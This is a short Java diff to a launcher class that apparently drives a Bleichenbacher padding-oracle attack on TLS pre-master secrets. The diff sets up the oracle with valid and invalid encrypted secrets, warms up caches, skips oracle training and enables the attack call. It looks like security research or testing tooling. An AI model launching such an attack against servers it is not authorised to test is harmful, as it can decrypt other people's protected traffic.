@@ -156,11 +156,17 @@ public final class Launcher {
                 OracleType.TTT, publicKey, privateKey, 
                 properties.getProperty("command"));
 
+        // setup PMSs
+        oracle.setValidPMS(encValidPMS);
+        oracle.setInvalidPMS(encInvalidPMS);
+        // Warmup SSL caches
+        oracle.warmup();
+        
         // train oracle
-        oracle.trainOracle(encValidPMS, encInvalidPMS);
+        // oracle.trainOracle(encValidPMS, encInvalidPMS);
 
         // launch the attack
-//        Bleichenbacher attack = new Bleichenbacher(encValidPMS, oracle, true);
-//        attack.attack();
+        Bleichenbacher attack = new Bleichenbacher(encValidPMS.clone(), oracle, true);
+        attack.attack();
     }
 }
